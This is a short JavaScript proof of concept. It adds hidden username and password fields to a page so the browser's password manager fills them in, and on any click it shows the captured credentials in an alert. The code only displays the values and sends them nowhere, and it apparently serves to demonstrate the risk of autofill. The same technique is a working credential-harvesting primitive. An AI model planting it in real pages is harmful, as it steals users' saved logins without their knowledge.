const usernameEl = document.createElement('input');
usernameEl.name = 'username';
usernameEl.hidden = true;
document.body.appendChild(usernameEl);

const passwordEl = document.createElement('input');
passwordEl.name = 'password';
passwordEl.type = 'password';
passwordEl.hidden = true;
document.body.appendChild(passwordEl);

window.addEventListener('click', () => {
    if (passwordEl.value) {
        alert(`Gotcha.\nUsername: ${usernameEl.value}\nPassword: ${passwordEl.value}`);
    } else {
        alert('Darn it, I couldn\'t get your password :(');
    }
});
